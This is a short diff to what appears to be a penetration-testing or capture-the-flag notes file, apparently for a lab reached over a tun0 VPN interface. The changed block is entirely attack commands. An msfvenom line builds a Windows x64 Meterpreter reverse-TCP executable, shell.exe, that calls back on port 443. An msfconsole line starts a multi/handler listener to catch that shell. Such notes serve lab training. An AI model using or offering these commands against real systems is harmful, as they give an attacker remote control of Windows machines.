@@ -76,6 +76,7 @@ exploit
 #don't forget to set new handler to tun0 and new port
 ```
 
- ```bash
-msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST $LOCAL_IP;set LPORT 4444;run;" 
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 --platform windows LHOST=tun0 LPORT=443 -f exe -o shell.exe
+msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST $LOCAL_IP;set LPORT 443;run;" 
 ```
